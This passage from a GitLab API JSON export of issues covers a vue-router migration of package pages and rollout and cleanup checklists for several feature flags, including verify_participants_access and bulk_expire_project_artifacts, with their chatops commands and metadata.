Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"}],"author":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"type":"ISSUE","assignee":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347411","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347411","notes":"https://gitlab.com/api/v4/projects/278964/issues/347411/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347411/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347411","relative":"#347411","full":"gitlab-org/gitlab#347411"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6870,"epic":{"id":364935,"iid":6870,"title":"Compliance report merge request violations frontend MVP","url":"/groups/gitlab-org/-/epics/6870","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98660319,"iid":347409,"project_id":278964,"title":"Migrate package details page to vue-router","description":"As seen in the the Container Registry it would be beneficial to migrate the package list and details from two separate pages served by rails to two pages but handled by `vue-router` and javascript.\n\nBenefits:\n\n* Only as part of the page needs to reload when navigating\n* Snappier transition from the list to details and vice-versa\n* Increased performances because we can fully leverage the cache coming from graphql\n* Consistency in the package codebase\n* If we decide to peruse page transition they could be added effortlessly\n\n### Testing \u0026 Availability\n\nPlease trigger the `package-and-qa` job in this MR to test all works as expected with existing package managers at the end to end level\n\nRelated to #197411.","state":"closed","created_at":"2021-12-08T10:20:13.652Z","updated_at":"2022-01-18T07:02:20.637Z","closed_at":"2022-01-17T10:07:27.486Z","closed_by":{"id":4584738,"username":"nmezzopera","name":"Nicol Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"},"labels":["Category:Package Registry","Deliverable","Package:P1","UX","backend","bug::performance","devops::package","frontend","group::package registry","quad-planning::complete-action","ruby","section::ops","severity::4","type::feature","workflow::in review"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":4584738,"username":"nmezzopera","name":"Nicol Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"}],"author":{"id":4584738,"username":"nmezzopera","name":"Nicol Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"},"type":"ISSUE","assignee":{"id":4584738,"username":"nmezzopera","name":"Nicol Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347409","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347409","notes":"https://gitlab.com/api/v4/projects/278964/issues/347409/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347409/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347409","relative":"#347409","full":"gitlab-org/gitlab#347409"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98660085,"iid":347408,"project_id":278964,"title":"[Feature flag] Cleanup ff_limit_ssh_key_lifetime","description":"\u003c!-- This template is a great use for issues that are feature::additions or technical tasks for larger issues.--\u003e\n\n### Proposal\n\nIn %14.6 SSH key lifetime feature was released behind a [default enabled feature flag](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/76217). We need to remove the feature flag in the any of the milestones from %14.7\n\n\u003c!-- Use this section to explain the feature and how it will work. It can be helpful to add technical details, design proposals, and links to related epics or issues. --\u003e\n\n\u003c!-- Consider adding related issues and epics to this issue. You can also reference the Feature Proposal Template (https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Feature%20proposal%20-%20detailed.md) for additional details to consider adding to this issue. Additionally, as a data oriented organization, when your feature exits planning breakdown, consider adding the `What does success look like, and how can we measure that?` section.\n--\u003e\n\n\n* [x] Create a merge request to remove `ff_limit_ssh_key_lifetime` feature flag. Ask for review and merge it.\n  * [x] Remove all references to the feature flag from the codebase.\n  * [x] Remove the YAML definitions for the feature from the repository.\n  * [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n* [x] Ensure that the cleanup MR has been deployed to both production and canary. If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1), the feature can be officially announced in a release blog post.\n  * [x] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n* [x] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n  * [x] `/chatops run feature delete ff_limit_ssh_key_lifetime --dev`\n  * [x] `/chatops run feature delete ff_limit_ssh_key_lifetime --staging`\n  * [x] `/chatops run feature delete ff_limit_ssh_key_lifetime`\n* [x] Close this feature flag cleanup issue.\n\n\n\u003c!-- Label reminders\nUse the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n--\u003e\n\nRelates to #346753","state":"closed","created_at":"2021-12-08T10:16:41.743Z","updated_at":"2022-01-10T09:38:21.826Z","closed_at":"2022-01-10T09:38:12.389Z","closed_by":{"id":9821577,"username":"huzaifaiftikhar1","name":"Huzaifa Iftikhar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9821577/avatar.png","web_url":"https://gitlab.com/huzaifaiftikhar1"},"labels":["GitLab Ultimate","devops::manage","feature flag","feature::addition","group::compliance","ideal for new hires","priority::2","section::dev","settings","type::feature","workflow::verification"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":9821577,"username":"huzaifaiftikhar1","name":"Huzaifa Iftikhar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9821577/avatar.png","web_url":"https://gitlab.com/huzaifaiftikhar1"}],"author":{"id":9821577,"username":"huzaifaiftikhar1","name":"Huzaifa Iftikhar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9821577/avatar.png","web_url":"https://gitlab.com/huzaifaiftikhar1"},"type":"ISSUE","assignee":{"id":9821577,"username":"huzaifaiftikhar1","name":"Huzaifa Iftikhar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9821577/avatar.png","web_url":"https://gitlab.com/huzaifaiftikhar1"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347408","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":11,"completed_count":11},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"11 of 11 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347408","notes":"https://gitlab.com/api/v4/projects/278964/issues/347408/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347408/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347408","relative":"#347408","full":"gitlab-org/gitlab#347408"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98659368,"iid":347407,"project_id":278964,"title":"[Feature flag] Rollout of `verify_participants_access`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [the feature](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74906) on production,\nthat is currently behind the `verify_participants_access` feature flag.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n* Team: ~\"group::source code\"\n* Most appropriate slack channel to reach out to: `#g_create_source-code-be`\n* Best individual to reach out to: @vyaklushin\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\nWe expect to see only visible participants for the user\n\n### What might happen if this goes wrong?\n\nWe don't see participants or the response returns a 500 error.\n\n### What can we monitor to detect problems with this?\n\nP99 count for `participants`\nhttps://log.gprd.gitlab.net/goto/31f38644b5410ca751032d7e473dc1e1\n\n\n### What can we check for monitoring production after rollouts?\n\nhttps://log.gprd.gitlab.net/goto/29a715fda3ed4bbab71d90b059b97404\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set verify_participants_access true --dev`\n    - [x] `/chatops run feature set verify_participants_access true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab verify_participants_access true`\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab-foss verify_participants_access true`\n    - [x] `/chatops run feature set --project=gitlab-com/www-gitlab-com verify_participants_access true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org verify_participants_access true`\n    - [ ] `/chatops run feature set --group=gitlab-com verify_participants_access true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e verify_participants_access true`\n- [x] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74906) an estimated time this will be enabled on GitLab.com.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [x] `/chatops run feature set verify_participants_access \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set verify_participants_access \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [ ] `/chatops run feature set verify_participants_access true`\n- [x] Announce on [the feature issue](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74906) that the feature has been globally enabled.\n- [x] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74906) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `verify_participants_access`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [x] Create a merge request to remove `verify_participants_access` feature flag. Ask for review and merge it.\n    - [x] Remove all references to the feature flag from the codebase.\n    - [x] Remove the YAML definitions for the feature from the repository.\n    - [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [x] Close [the feature issue](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74906) to indicate the feature will be released in the current milestone.\n- [x] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [x] `/chatops run feature delete verify_participants_access --dev`\n    - [x] `/chatops run feature delete verify_participants_access --staging`\n    - [x] `/chatops run feature delete verify_participants_access`\n- [x] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set verify_participants_access false\n```","state":"closed","created_at":"2021-12-08T10:08:34.349Z","updated_at":"2022-01-10T09:29:56.907Z","closed_at":"2022-01-10T09:29:56.889Z","closed_by":{"id":421631,"username":"vyaklushin","name":"Vasilii Iakliushin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/421631/avatar.png","web_url":"https://gitlab.com/vyaklushin"},"labels":["Category:Source Code Management","Stretch","devops::create","feature flag","feature::addition","group::source code","section::dev","type::feature","workflow::verification"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":421631,"username":"vyaklushin","name":"Vasilii Iakliushin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/421631/avatar.png","web_url":"https://gitlab.com/vyaklushin"}],"author":{"id":421631,"username":"vyaklushin","name":"Vasilii Iakliushin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/421631/avatar.png","web_url":"https://gitlab.com/vyaklushin"},"type":"ISSUE","assignee":{"id":421631,"username":"vyaklushin","name":"Vasilii Iakliushin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/421631/avatar.png","web_url":"https://gitlab.com/vyaklushin"},"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347407","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":49,"completed_count":24},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"24 of 49 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347407","notes":"https://gitlab.com/api/v4/projects/278964/issues/347407/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347407/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347407","relative":"#347407","full":"gitlab-org/gitlab#347407"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98656517,"iid":347405,"project_id":278964,"title":"[Feature flag] Rollout of `bulk_expire_project_artifacts`","description":"\n## Summary\n\nThis issue is to rollout [the API to bulk delete project artifacts](https://gitlab.com/gitlab-org/gitlab/-/issues/223793) on production,\nthat is currently behind the `bulk_expire_project_artifacts` feature flag.\n\nThis feature introduces a new API, which allows users to delete all erasable artifacts in bulk from their projects.\n```\nDELETE /projects/:id/artifacts\n```\n\nIn terms of implementation, the API schedules a worker to set all erasable artifacts with `locked: :unlocked` and `expire_at` to the current time. As a result, these artifacts will be put on queue for removal by `ExpireBuildArtifactsWorker`.\n\n## Owners\n\n- Team: ~\"group::testing\"\n- Most appropriate slack channel to reach out to: `#g_testing`\n- Best individual to reach out to: @alberts-gitlab (or @drew)\n- PM: Jackie Porter @jreporter \n\n## Stakeholders\n\nAre there any other stages or teams involved that need to be kept in the loop?\n- @jreporter  (PM)\n- @shampton (FCL https://gitlab.com/gitlab-org/ci-cd/testing-group/-/issues/82)\n\n## Expectations\n\n### What are we expecting to happen?\n\nWhen this feature is enabled, the API `DELETE /projects/:id/artifacts` would be available to project maintainers. Project maintainers can call this API to remove all existing erasable job artifacts from non-locked pipelines.\n\nSome keywords here are:\n- erasable job artifacts - all job artifacts except `trace`\n- non-locked pipelines - pipelines that are not the latest pipeline of each ref.\n\nWhen the API is called, we would expect the number of artifacts that will be picked up by `ExpireBuildArtifactsWorker` to increase.\n\n### When is the feature viable?\n\n`ExpireBuildArtifactsWorker` needs to be running in order for the artifact deletion to complete. This worker is currently turned off following the incident https://gitlab.com/gitlab-com/gl-infra/production/-/issues/5952.\n\n`ExpireBuildArtifactsWorker` has been re-enabled (see https://gitlab.com/groups/gitlab-org/-/epics/7311#first-set-of-feature-flags-3).\n\n### What might happen if this goes wrong?\n\n* Performance degradation when processing `ExpireBuildArtifactsWorker`\n\nWe should turn off the feature flag if we see these issues.\n\n### What can we monitor to detect problems with this?\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n_Consider mentioning checks for 5xx errors or other anomalies like an increase in redirects\n(302 HTTP response status)_\n\n### What can we check for monitoring production after rollouts?\n\n_Consider adding links to check for Sentry errors, Production logs for 5xx, 302s, etc._\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set bulk_expire_project_artifacts true --dev`\n    - [x] `/chatops run feature set bulk_expire_project_artifacts true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable. (result in [comment](https://gitlab.com/gitlab-org/gitlab/-/issues/347405#note_810450506))\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab bulk_expire_project_artifacts true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss bulk_expire_project_artifacts true`\n    - [ ] `/chatops run feature set --project=gitlab-com/www-gitlab-com bulk_expire_project_artifacts true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org bulk_expire_project_artifacts true`\n    - [ ] `/chatops run feature set --group=gitlab-com bulk_expire_project_artifacts true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e bulk_expire_project_artifacts true`\n- [x] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [x] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [x] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [x] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n    - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n        - [ ] `/chatops run feature set bulk_expire_project_artifacts \u003crollout-percentage\u003e --actors`\n    - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n        - [ ] `/chatops run feature set bulk_expire_project_artifacts \u003crollout-percentage\u003e`\n    - Enable the feature globally on production environment.\n        - [ ] `/chatops run feature set bulk_expire_project_artifacts true`\n- [x] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [x] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [x] Create a merge request with the following changes. Ask for review and merge it. https://gitlab.com/gitlab-org/gitlab/-/merge_requests/78429\n    - [x] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [x] Ensure that the default-enabling MR has been deployed to both production and canary.\n  If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n  the feature can be officially announced in a release blog post.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [x] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [x] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [x] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [x] Set the title to \"[Feature flag] Cleanup `bulk_expire_project_artifacts`\".\n    - [x] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [x] Link this rollout issue as a related issue.\n    - [x] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `bulk_expire_project_artifacts` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n  If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n  the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete bulk_expire_project_artifacts --dev`\n    - [ ] `/chatops run feature delete bulk_expire_project_artifacts --staging`\n    - [ ] `/chatops run feature delete bulk_expire_project_artifacts`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set bulk_expire_project_artifacts false\n```","state":"closed","created_at":"2021-12-08T09:38:33.823Z","updated_at":"2022-03-01T08:02:00.664Z","closed_at":"2022-01-25T07:59:37.680Z","closed_by":{"id":6354882,"username":"alberts-gitlab","name":"Albert Salim","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6354882/avatar.png","web_url":"https://gitlab.com/alberts-gitlab"},"labels":["Category:Build Artifacts","devops::verify","feature flag","feature::addition","group::pipeline insights","missed:14.7","section::ops","type::feature","workflow::in dev"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":6354882,"username":"alberts-gitlab","name":"Albert Salim","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6354882/avatar.png","web_url":"https://gitlab.com/alberts-gitlab"}],"author":{"id":6354882,"username":"alberts-gitlab","name":"Albert Salim","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6354882/avatar.png","web_url":"https://gitlab.com/alberts-gitlab"},"type":"ISSUE","assignee":{"id":6354882,"username":"alberts-gitlab","name":"Albert 